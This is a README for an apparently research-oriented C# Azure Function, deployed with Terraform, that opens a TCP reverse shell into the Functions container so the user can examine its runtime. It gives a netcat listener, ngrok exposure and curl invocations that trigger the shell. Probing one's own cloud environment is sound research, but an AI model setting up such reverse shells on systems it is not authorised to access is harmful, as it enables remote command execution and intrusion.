# Puma Prey Cougar

Cougar is a C# function that can be deployed to the Azure to establish a TCP reverse shell for the purposes of introspecting the Azure Functions container runtime.

## Installing Prerequisites

* [.NET Core 3.1 SDK](https://dotnet.microsoft.com/download)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)
* [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local)

## Deploying the Function

```bash
cd terraform
terraform init
export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
terraform apply
```

You will likely get the following error on your first apply:

```
Error: Error running command 'cd ../src; func azure functionapp publish cougarYOUR_UNIQUE_STRING': exit status 1. Output: Can't find app with name "cougarYOUR_UNIQUE_STRING"
```

This means that the function app wasn't in an operable state when the function deploy command was run. Try running `terraform apply` again when this happens.

## Testing in Azure

Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):

```bash
nc -l 4444
```

To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Retrieve the API key in the Azure Portal by searching for "Function App", clicking on the new Function App resource, clicking "Manage", and clicking "Click to show" next to the default function key.

Invoke your function, supplying your connection details and API key:

```bash
curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER&code=YOUR_API_KEY"
```

Your listener will now act as a reverse shell for the duration of the function invocation.

## Teardown

```bash
terraform destroy
```

## Running Locally

```bash
cd src
dotnet restore
dotnet build
func start
```

## Testing Locally

```bash
curl 'http://localhost:7071/api/Cougar?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
```

## Azure Function C# Template

```bash
func init Cougar --csharp --dotnet
func new --template "HTTP trigger" --name GetCougar
```
